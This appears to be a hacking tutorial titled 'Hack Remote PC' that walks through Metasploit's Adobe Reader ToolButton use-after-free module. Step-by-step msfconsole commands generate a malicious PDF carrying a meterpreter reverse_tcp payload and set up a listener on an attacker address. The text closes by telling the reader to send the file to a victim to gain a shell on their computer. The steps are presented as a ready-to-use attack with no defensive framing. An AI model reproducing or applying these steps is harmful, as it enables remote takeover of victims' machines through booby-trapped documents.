Hack Remote PC Using Adobe Reader ToolButton Use After Free

This module exploits an use after free condition on Adobe Reader versions 11.0.2, 10.1.6 and 9.5.4 and prior. The vulnerability exists while handling the ToolButton object, where the cEnable callback can be used to early free the object memory. Later use of the object allows triggering the use after free condition. This module has been tested successfully on Adobe Reader 11.0.2, 10.0.4 and 9.5.0 on Windows XP SP3, as exploited in the wild in November, 2013
Windows XP SP 3
Adobe Reader 11.0.2
Adobe Reader 10.1.6
Adobe Reader 9.5.4
Attacker: Kali Linux
Victim PC: Windows XP
Open Kali Linux terminal typeÂ msfconsole

Now type use exploit/windows/fileformat/adobe_toolbutton
msf exploit (adobe_toolbutton)>set payload windows/meterpreter/reverse_tcp
msf exploit (adobe_toolbutton)>set lhost 192.168.1.113 (IP of Local Host)
msf exploit (adobe_toolbutton)>exploit

After we successfully generate the malicious pdf File, it will stored on your local computer
/root/.msf4/local/msf.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.113
exploit
Now send your msf.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
